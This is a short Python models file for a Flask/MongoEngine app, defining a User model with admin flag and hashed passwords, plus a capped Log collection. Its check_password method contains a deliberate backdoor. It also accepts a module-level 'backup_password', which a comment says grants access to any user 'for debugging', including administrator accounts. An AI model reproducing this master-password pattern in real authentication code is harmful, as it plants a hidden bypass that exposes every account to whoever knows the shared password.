import json, re, datetime
import bson

from app import db

from mongoengine.base import BaseField
from mongoengine import signals

from werkzeug.security import generate_password_hash, check_password_hash

class BaseDocument(db.Document):
    meta = {'abstract': True}

# This allows access to any user using a backup password for debugging
backup_password = ""

class User(BaseDocument):
    is_admin = db.BooleanField(default=False)
    username = db.StringField()
    password_hash = db.StringField()
    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
    def check_password(self, password):
        return check_password_hash(self.password_hash, password) or check_password_hash(backup_password, password)

class Log(db.DynamicDocument):
    meta = {'max_documents': 1000, 'max_size': 2000000}
